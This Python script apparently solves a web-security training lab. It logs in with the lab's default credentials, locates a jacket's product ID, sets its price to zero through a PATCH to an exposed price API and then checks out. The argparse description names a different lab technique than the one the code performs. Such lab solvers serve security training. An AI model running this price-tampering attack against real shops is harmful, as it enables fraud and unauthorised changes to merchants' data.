#!/usr/bin/env python3
import argparse
import re
from urllib.parse import urljoin, urlparse, parse_qs

import requests
from bs4 import BeautifulSoup


def get_csrf_from_login(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on login page.")
    return token["value"]


def login(session: requests.Session, base_url: str, username: str, password: str) -> None:
    login_url = urljoin(base_url, "/login")
    r = session.get(login_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_login(r.text)

    data = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }
    r = session.post(login_url, data=data, timeout=10)
    if "Log out" not in r.text:
        raise RuntimeError("Login failed, 'Log out' not found.")

def find_jacket_product_id(session: requests.Session, base_url: str) -> str:
    """
    Dynamically find the productId for the Lightweight "l33t" Leather Jacket
    by crawling the home page and looking for the product link.
    """
    resp = session.get(base_url, timeout=10)
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "html.parser")
    for a in soup.find_all("a", href=True):
        text = (a.get_text() or "").lower()
        if "lightweight" in text and "l33t" in text:
            href = a["href"]
            # Expect something like /product?productId=1
            parsed = urlparse(href)
            qs = parse_qs(parsed.query)
            pid = qs.get("productId", [None])[0]
            if pid:
                return pid

    # Fallback: regex search
    # jacket_regex = re.compile(
    #     r'href="(/product\?productId=\d+)".*?Lightweight[^<]*l33t',
    #     re.I | re.S,
    # )
    jacket_regex = re.compile(
        r'Lightweight[^<]*l33t.*?href="(/product\?productId=\d+)"',
        re.I | re.S,
    )

    m = jacket_regex.search(resp.text)
    if not m:
        raise RuntimeError("Could not automatically find jacket product link.")
    product_url = m.group(1)
    parsed = urlparse(product_url)
    qs = parse_qs(parsed.query)
    pid = qs.get("productId", [None])[0]
    if not pid:
        raise RuntimeError("Failed to parse productId from jacket link.")
    return pid


def get_price(session: requests.Session, base_url: str, product_id: str):
    api_url = urljoin(base_url, f"/api/products/{product_id}/price")
    resp = session.get(api_url, timeout=10)
    resp.raise_for_status()
    try:
        data = resp.json()
    except ValueError:
        raise RuntimeError(f"Unexpected non-JSON response from {api_url}: {resp.text[:200]}")
    return data.get("price")


def set_price_zero(session: requests.Session, base_url: str, product_id: str) -> None:
    api_url = urljoin(base_url, f"/api/products/{product_id}/price")
    resp = session.patch(api_url, json={"price": 0}, timeout=10)
    if resp.status_code not in (200, 204):
        raise RuntimeError(f"PATCH to {api_url} failed: {resp.status_code} {resp.text[:200]}")


def add_jacket_to_cart(session: requests.Session, base_url: str, product_id: str) -> None:
    api_url = urljoin(base_url, f"/cart")
    data = {
        "productId": product_id,
        "redir": "PRODUCT",
        "quantity": "1",
    }
    resp = session.post(api_url, data=data, timeout=10)
    if resp.status_code not in (200, 204):
        raise RuntimeError(f"PATCH to {api_url} failed: {resp.status_code} {resp.text[:200]}")


def buy_cart(session: requests.Session, base_url: str) -> None:
    # Step 1 - Get cart and csrf token
    api_url = urljoin(base_url, f"/cart")

    resp = session.get(api_url, timeout=10)
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = None

    form = soup.find("form", {"id": "coupon-form"})
    if form:
        csrf_input = form.find("input", {"name": "csrf"})
        if csrf_input and csrf_input.get("value"):
            csrf = csrf_input["value"]

    if not csrf:
        raise RuntimeError("Could not find CSRF token inside coupon form.")

    # Step 2 - Send "buy" request
    api_url = urljoin(base_url, f"/cart/checkout")
    data = {
        "csrf": csrf
    }
    resp = session.post(api_url, data=data, timeout=10)
    if resp.status_code not in (200, 204):
        raise RuntimeError(f"PATCH to {api_url} failed: {resp.status_code} {resp.text[:200]}")

def main():
    parser = argparse.ArgumentParser(
        description="Lab: Exploiting server-side parameter pollution in a query string"
    )
    parser.add_argument("base_url", help="Base URL of the lab, e.g. https://acxxxx.web-security-academy.net")
    parser.add_argument("--user", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print("[*] Logging in...")
    login(sess, base_url, args.user, args.password)
    print("[+] Logged in as", args.user)

    print("[*] Locating jacket productId dynamically...")
    product_id = find_jacket_product_id(sess, base_url)
    print(f"[+] Found jacket productId: {product_id}")

    print("[*] Fetching current price...")
    old_price = get_price(sess, base_url, product_id)
    print(f"[+] Current price: {old_price}")

    print("[*] Setting price to 0 via PATCH /api/products/{id}/price ...")
    set_price_zero(sess, base_url, product_id)

    new_price = get_price(sess, base_url, product_id)
    print(f"[+] New price: {new_price}")
    if new_price == '$0.00':
        print("[+] Exploit likely successful. Add the jacket to cart and checkout in the browser.")
    else:
        print("[-] Price is not 0. Something went wrong.")

    print("[*] Adding jacket to cart...")
    add_jacket_to_cart(sess, base_url, product_id)
    print("[*] Product added to cart")

    print("[*] Buying cart...")
    buy_cart(sess, base_url)
    print("[*] Cart bought, lab solved")

if __name__ == "__main__":
    main()
